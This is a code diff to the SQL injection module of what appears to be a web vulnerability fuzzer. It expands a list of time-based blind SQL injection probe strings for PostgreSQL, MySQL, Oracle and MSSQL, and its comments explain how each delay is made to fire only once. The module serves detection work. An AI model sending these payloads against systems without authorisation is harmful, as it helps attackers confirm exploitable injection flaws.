@@ -214,12 +214,25 @@ class sqli(BaseLightfuzz):
         except HttpCompareError as e:
             self.verbose(f"Encountered HttpCompareError Sending Compare Probe: {e}")
 
-        # These are common SQL injection payloads for inducing an intentional delay across several different SQL database types
+        # Time-based blind SQLi payloads across DB families. Each probe is engineered
+        # to fire its delay exactly once so the measured elapsed time stays close to
+        # self.expected_delay regardless of table row count. Row-independent variants
+        # use `IS NOT NULL` (since SLEEP returns 0 — not NULL) combined with `LIMIT 1`
+        # to force a single match on the first row scanned.
         standard_probe_strings = [
-            f"'||pg_sleep({str(self.expected_delay)})--",  # postgres
-            f"1' AND (SLEEP({str(self.expected_delay)})) AND '",  # mysql
-            f"' AND (SELECT FROM DBMS_LOCK.SLEEP({str(self.expected_delay)})) AND '1'='1"  # oracle (not tested)
-            f"; WAITFOR DELAY '00:00:{str(self.expected_delay)}'--",  # mssql (not tested)
+            # postgres
+            f"'||pg_sleep({self.expected_delay})--",
+            f"' OR (SELECT TRUE FROM pg_sleep({self.expected_delay})) LIMIT 1-- -",
+            # mysql (row-dependent; fires once when original_value matches a row)
+            f"1' AND (SLEEP({self.expected_delay})) AND '",
+            # mysql (row-independent; one SLEEP, exits on first row via LIMIT 1)
+            f"' OR SLEEP({self.expected_delay}) IS NOT NULL LIMIT 1-- -",
+            f" OR SLEEP({self.expected_delay}) IS NOT NULL LIMIT 1-- -",
+            # oracle (DUAL is single-row so DBMS_LOCK.SLEEP fires once)
+            f"' AND (SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP({self.expected_delay})=0) AND '1'='1",
+            # mssql (stacked query, fires once)
+            f"'; WAITFOR DELAY '00:00:{self.expected_delay}'--",
+            f"; WAITFOR DELAY '00:00:{self.expected_delay}'--",
         ]
 
         baseline_1 = await self.standard_probe(
